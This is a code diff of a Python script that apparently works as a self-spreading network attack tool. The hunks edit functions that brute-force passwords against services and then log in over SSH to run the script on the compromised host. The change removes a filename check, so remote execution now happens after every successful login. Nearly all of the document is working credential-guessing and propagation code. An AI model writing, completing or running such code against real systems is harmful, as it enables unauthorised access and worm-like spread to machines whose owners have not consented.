@@ -352,14 +352,9 @@ def propagate_script(ip, port, login_string):
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                if os.path.basename(__file__) == strings.NET_PROPAGATION:
-                    client.exec_command(strings.run_script_command(
-                        os.path.basename(__file__)))
-                    client.close()
-                    return True
+                client.exec_command(strings.run_script_command())
                 client.close()
-                return False
-
+                return True
             except RuntimeError:
                 client.close()
                 return False
@@ -444,9 +439,8 @@ def sign_in_service(ip, port, username, password_list):
     :return None: Only done to indicate an unsuccessful task
     """
     for password in password_list:
-        login_details = (try_password_for_service(ip, port, username,
-                                                  password))
-        if login_details != strings.BLANK_STRING:
+        login_details = try_password_for_service(ip, port, username, password)
+        if login_details is not False:
             return login_details
     return None
 
@@ -561,10 +555,10 @@ def try_password_for_service(ip, port, username, password):
         connect_service = connect_service_switch.get(str(port))
         if connect_service():
             return str(username) + strings.COLON + str(password)
-        return strings.BLANK_STRING
+        return False
 
     except RuntimeError:
-        return strings.BLANK_STRING
+        return False
 
 
 def try_propagating(arguments, ip, port, bruteforce):
